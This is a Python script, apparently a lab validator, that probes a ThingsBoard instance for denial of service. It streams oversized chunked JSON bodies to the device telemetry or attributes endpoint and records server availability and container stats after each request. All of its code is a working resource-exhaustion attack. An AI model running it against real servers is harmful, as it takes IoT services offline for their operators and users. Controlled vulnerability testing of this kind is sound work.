#!/usr/bin/env python3
import argparse
import json
import socket
import subprocess
import sys
import time
from pathlib import Path
from urllib.request import Request, urlopen


def chunk(sock, data: bytes) -> None:
    if not data:
        return
    sock.sendall(("%x\r\n" % len(data)).encode("ascii"))
    sock.sendall(data)
    sock.sendall(b"\r\n")


def stream_many_keys_json(sock, target_bytes: int, chunk_bytes: int) -> int:
    sent = 0
    first = True
    chunk(sock, b"{")
    sent += 1
    i = 0
    while sent < target_bytes - 1:
        prefix = b"" if first else b","
        item = prefix + ('"k%08d":%d' % (i, i)).encode("ascii")
        if sent + len(item) > target_bytes - 1:
            break
        if len(item) <= chunk_bytes:
            chunk(sock, item)
        else:
            for off in range(0, len(item), chunk_bytes):
                chunk(sock, item[off : off + chunk_bytes])
        sent += len(item)
        first = False
        i += 1
    chunk(sock, b"}")
    sent += 1
    sock.sendall(b"0\r\n\r\n")
    return sent


def stream_large_value_json(sock, target_bytes: int, chunk_bytes: int, timeseries: bool = False) -> int:
    if timeseries:
        prefix = b'{"ts":1,"values":{"k":"'
        suffix = b'"}}'
    else:
        prefix = b'{"k":"'
        suffix = b'"}'
    sent = 0
    chunk(sock, prefix)
    sent += len(prefix)
    fill_len = max(0, target_bytes - len(prefix) - len(suffix))
    fill = b"A" * max(1, chunk_bytes)
    while fill_len > 0:
        part = fill if fill_len >= len(fill) else b"A" * fill_len
        chunk(sock, part)
        sent += len(part)
        fill_len -= len(part)
    chunk(sock, suffix)
    sent += len(suffix)
    sock.sendall(b"0\r\n\r\n")
    return sent


def stream_json(sock, target_bytes: int, chunk_bytes: int, payload_mode: str) -> int:
    if payload_mode == "many-keys":
        return stream_many_keys_json(sock, target_bytes, chunk_bytes)
    if payload_mode == "large-value":
        return stream_large_value_json(sock, target_bytes, chunk_bytes, timeseries=False)
    if payload_mode == "timeseries-large-value":
        return stream_large_value_json(sock, target_bytes, chunk_bytes, timeseries=True)
    raise ValueError(f"unsupported payload_mode: {payload_mode}")


def post_chunked(
    host: str,
    port: int,
    token: str,
    endpoint: str,
    target_bytes: int,
    timeout: int,
    chunk_bytes: int,
    payload_mode: str,
) -> dict:
    path = f"/api/v1/{token}/{endpoint}"
    start = time.time()
    with socket.create_connection((host, port), timeout=timeout) as sock:
        sock.settimeout(timeout)
        headers = (
            f"POST {path} HTTP/1.1\r\n"
            f"Host: {host}:{port}\r\n"
            "User-Agent: tb-dos-dynamic-validator/1\r\n"
            "Content-Type: application/json\r\n"
            "Transfer-Encoding: chunked\r\n"
            "Connection: close\r\n"
            "\r\n"
        ).encode("ascii")
        sock.sendall(headers)
        body_sent = stream_json(sock, target_bytes, chunk_bytes, payload_mode)
        response = bytearray()
        while True:
            try:
                data = sock.recv(65536)
            except socket.timeout:
                break
            if not data:
                break
            response.extend(data)
    elapsed = time.time() - start
    first_line = response.split(b"\r\n", 1)[0].decode("iso-8859-1", "replace") if response else ""
    return {
        "path": path,
        "payload_mode": payload_mode,
        "target_bytes": target_bytes,
        "body_bytes_sent": body_sent,
        "elapsed_seconds": round(elapsed, 3),
        "status_line": first_line,
        "response_prefix": response[:4096].decode("iso-8859-1", "replace"),
    }


def availability(host: str, port: int) -> dict:
    url = f"http://{host}:{port}/login"
    start = time.time()
    try:
        req = Request(url, headers={"User-Agent": "tb-dos-dynamic-validator/1"})
        with urlopen(req, timeout=5) as resp:
            code = resp.getcode()
            body = resp.read(256)
        return {"url": url, "ok": 200 <= code < 500, "status": code, "elapsed_seconds": round(time.time() - start, 3), "body_prefix": body.decode("utf-8", "replace")}
    except Exception as exc:
        return {"url": url, "ok": False, "error": repr(exc), "elapsed_seconds": round(time.time() - start, 3)}


def docker_stats(container: str) -> str:
    try:
        return subprocess.check_output(
            ["docker", "stats", "--no-stream", "--format", "{{json .}}", container],
            stderr=subprocess.STDOUT,
            text=True,
            timeout=10,
        ).strip()
    except Exception as exc:
        return json.dumps({"error": repr(exc)})


def main() -> int:
    parser = argparse.ArgumentParser()
    parser.add_argument("--host", default="127.0.0.1")
    parser.add_argument("--port", type=int, default=18080)
    parser.add_argument("--token", default="")
    parser.add_argument("--endpoint", choices=["telemetry", "attributes"], default="telemetry")
    parser.add_argument(
        "--payload-mode",
        choices=["many-keys", "large-value", "timeseries-large-value"],
        default="many-keys",
    )
    parser.add_argument("--sizes-mib", default="1,8,32,56,64")
    parser.add_argument("--timeout", type=int, default=90)
    parser.add_argument("--chunk-bytes", type=int, default=16384)
    parser.add_argument("--container", default="tb-dos-thingsboard-static-0001-node")
    parser.add_argument("--out", default="logs/probe_results.jsonl")
    args = parser.parse_args()

    if not args.token:
        print("DEVICE_TOKEN is required via --token", file=sys.stderr)
        return 2

    out = Path(args.out)
    out.parent.mkdir(parents=True, exist_ok=True)
    sizes = [int(x) for x in args.sizes_mib.split(",") if x.strip()]
    with out.open("a", encoding="utf-8") as fh:
        for size_mib in sizes:
            before = availability(args.host, args.port)
            before_stats = docker_stats(args.container)
            try:
                result = post_chunked(
                    args.host,
                    args.port,
                    args.token,
                    args.endpoint,
                    size_mib * 1024 * 1024,
                    args.timeout,
                    args.chunk_bytes,
                    args.payload_mode,
                )
            except Exception as exc:
                result = {
                    "payload_mode": args.payload_mode,
                    "target_bytes": size_mib * 1024 * 1024,
                    "error": repr(exc),
                }
            after = availability(args.host, args.port)
            after_stats = docker_stats(args.container)
            record = {
                "time": time.strftime("%Y-%m-%dT%H:%M:%S%z"),
                "size_mib": size_mib,
                "payload_mode": args.payload_mode,
                "availability_before": before,
                "docker_stats_before": before_stats,
                "post_result": result,
                "availability_after": after,
                "docker_stats_after": after_stats,
            }
            fh.write(json.dumps(record, ensure_ascii=False) + "\n")
            fh.flush()
            if not after.get("ok"):
                break
            time.sleep(3)
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
